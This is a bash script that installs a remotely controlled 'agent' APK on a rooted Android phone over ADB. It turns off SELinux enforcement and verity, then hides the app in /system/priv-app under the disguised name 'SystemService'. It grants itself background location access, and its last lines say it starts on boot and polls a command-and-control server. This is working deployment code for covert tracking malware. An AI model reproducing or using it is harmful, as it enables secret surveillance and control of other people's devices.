#!/usr/bin/env bash
#
# deploy.sh — Install the agent APK as a privileged system application
# on a rooted Android device connected via ADB.
#
# Prerequisites:
#   - Rooted device with USB debugging enabled
#   - adb in PATH
#   - Compiled APK (run ./gradlew assembleRelease first)
#
set -euo pipefail

APK_PATH="app/build/outputs/apk/release/app-release.apk"
SYSTEM_DIR="/system/priv-app/SystemService"

echo "[*] Checking for APK..."
if [ ! -f "$APK_PATH" ]; then
    echo "[!] APK not found. Building..."
    ./gradlew assembleRelease
fi

echo "[*] Checking ADB connection..."
adb devices -l
adb root 2>/dev/null || true

echo "[*] Disabling SELinux (permissive mode)..."
adb shell "su -c setenforce 0" 2>/dev/null || adb shell setenforce 0 2>/dev/null || true

echo "[*] Remounting /system as read-write..."
adb disable-verity 2>/dev/null || true
adb reboot 2>/dev/null || true
echo "[*] Waiting for device to come back online..."
sleep 30
adb root 2>/dev/null || true
adb remount 2>/dev/null || adb shell "su -c mount -o rw,remount /" 2>/dev/null || true

echo "[*] Creating system app directory..."
adb shell "mkdir -p $SYSTEM_DIR" 2>/dev/null || true

echo "[*] Pushing APK to $SYSTEM_DIR/SystemService.apk ..."
adb push "$APK_PATH" "$SYSTEM_DIR/SystemService.apk"

echo "[*] Setting permissions..."
adb shell "chmod 644 $SYSTEM_DIR/SystemService.apk"

echo "[*] Granting runtime permissions..."
adb shell "pm grant com.android.systemservice android.permission.ACCESS_FINE_LOCATION" 2>/dev/null || true
adb shell "pm grant com.android.systemservice android.permission.ACCESS_COARSE_LOCATION" 2>/dev/null || true
adb shell "pm grant com.android.systemservice android.permission.ACCESS_BACKGROUND_LOCATION" 2>/dev/null || true
adb shell "pm grant com.android.systemservice android.permission.POST_NOTIFICATIONS" 2>/dev/null || true

echo "[*] Rebooting device..."
adb reboot

echo "[*] Waiting for boot (60s)..."
sleep 60

echo "[*] Verifying service is running..."
adb shell "dumpsys activity services com.android.systemservice" | head -5 || echo "[!] Service not found — it may take a moment to start."

echo "[+] Deployment complete."
echo "[i] The agent starts automatically on boot and polls the C2 server."
echo "[i] Issue commands from the C2 dashboard at https://<C2_IP>:4443/"
